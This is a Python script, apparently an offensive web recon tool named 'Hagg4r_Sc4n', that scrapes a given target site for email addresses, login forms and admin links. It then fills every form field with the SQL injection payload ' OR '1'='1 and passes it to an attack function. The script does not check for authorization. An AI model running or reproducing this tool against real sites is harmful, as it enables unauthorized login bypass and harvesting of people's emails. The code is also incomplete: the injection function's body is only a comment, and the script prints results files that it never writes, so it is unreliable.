import requests
from bs4 import BeautifulSoup
import pyfiglet
from termcolor import colored
import re
import argparse
import os
import subprocess

def banner():
    ascii_banner = pyfiglet.figlet_format("Hagg4r_Sc4n")
    print(colored(ascii_banner, 'green'))
print("by @hagg4r")
def parse_arguments():
    parser = argparse.ArgumentParser(description="Web Recon Scanner")
    parser.add_argument("target", help="Target website to scan")
    return parser.parse_args()

def find_emails(target):
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', soup.get_text())
        return list(set(emails))
    except Exception as e:
        print(colored(f"Error: {e}", 'red'))
        return []

def find_credentials(target):
    credentials = []
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'GET').upper()
            inputs = [input.get('name') for input in form.find_all('input') if input.get('name')]
            credentials.append((action, method, inputs))
    except Exception as e:
        print(colored(f"Error: {e}", 'red'))
    return credentials

def find_admin_pages(target):
    admin_pages = []
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and ('admin' in href.lower() or '/admin' in href.lower() or '/login' in href.lower()):
                admin_pages.append(href)
    except Exception as e:
        print(colored(f"Error: {e}", 'red'))
    return admin_pages

def perform_sql_injection(target, form_data):
    #... (same as before)

def main():
    banner()
    args = parse_arguments()
    target = args.target
    print(colored(f"\n[] Target: {target}", 'yellow'))

    print(colored("\n[] Found emails:", 'yellow'))
    emails = find_emails(target)
    if not emails:
        print(colored("  - None found.", 'yellow'))
    else:
        for email in emails:
            print(f"  - {email}")

    print(colored("\n[] Found potential credentials:", 'yellow'))
    credentials = find_credentials(target)
    if not credentials:
        print(colored("  - None found.", 'yellow'))
    else:
        for cred in credentials:
            form_data = {
                'action': cred[0],
                'method': cred[1],
                **{name: f"' OR '1'='1" for name in cred[2]}  # Add SQL Injection payload to form inputs
            }
            results_file = f"{os.path.expanduser('~')}/Desktop/{os.path.basename(cred[0])}.txt"
            perform_sql_injection(target, form_data)
            print(f"  - Action: {cred[0]}, Method: {cred[1]}, Inputs: {', '.join(cred[2])}, Results saved to {results_file}")

    print(colored("\n[] Found potential admin pages:", 'yellow'))
    admin_pages = find_admin_pages(target)
    if not admin_pages:
        print(colored("  - None found.", 'yellow'))
    else:
        for page in admin_pages:
            print(f"  - {page}")

if __name__ == "__main__":
    main()
